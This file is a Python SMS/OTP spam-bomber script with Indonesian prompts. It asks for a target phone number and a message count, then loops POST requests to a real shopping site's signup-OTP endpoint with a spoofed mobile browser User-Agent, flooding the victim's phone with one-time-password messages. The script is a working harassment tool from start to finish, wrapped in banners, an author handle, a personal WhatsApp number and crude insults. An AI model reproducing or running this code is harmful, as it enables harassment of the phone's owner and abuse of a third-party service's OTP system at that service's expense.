
import os,sys,time,requests
from requests import post
import subprocess

def bersih():
    os.system("clear")

def balik():
    f = input("\033[1;92m Coba Lagi asw?\033[1;97m (y/t): ")
    if f == "y":
        subprocess.call("python spam.py",shell=True)
    elif f == "t":
        print ("\033[1;91mExit!!\033[1;97m")
        sys.exit()

def kata(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./12)

bersih()

os.system("clear")
os.system("print MR.414N|figlet -f banner|lolcat -a")
os.system("print LOVE️|figlet -f banner|lolcat -a -i")
os.system("print LIA|figlet -f banner|lolcat -a")

os.system("clear")
os.system("print ========================================|lolcat -a")
os.system("print author=MR.414N|lolcat -a")
os.system("print CINTA KU LIA😙😙😙❤️❤️❤️😙😙😙|lolcat -a")
os.system("print WA=082292838634|lolcat -a")
os.system("print TEAM=INDONESIAN MULTITALENTED COMUNITY|lolcat -a")
os.system("print ========================================|lolcat -a")

try:
    no = input("\033[1;97m[\033[1;96mMasukan Nomor tergetnya pakek 628 yahh ☺️\033[1;97m]:\033[1;92m")
    jl = int(input("\033[1;97m[\033[1;96mMasukan Jumlah Spam cok😏\033[1;97m]:\033[1;92m"))
except KeyboardInterrupt:
       print ("\033[1;91mberhenti!!\033[1;97m")
       sys.exit()
head = {
"Connection": "keep-alive",
"User-Agent": "Mozilla/5.0 (Linux; Android 9; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
}
dot = {
"phone": no,
}
print ("\033[1;97m_"*50)
kata("\033[1;93m[\033[1;97m> > > > > > > > >\033[1;93m]")
def kirim():
    time.sleep(1)
    r = requests.post("https://cmsapi.mapclub.com/api/signup-otp", data=dot, headers=head)
    print ("terkirim:", r.json()["status"])

for i in range(jl):
    try:
        kirim()
    except requests.exceptions.ConnectionError:
           print ("\033[1;91mnyalakan datamu tai!!!!\033[1;97m")
           sys.exit()
balik()
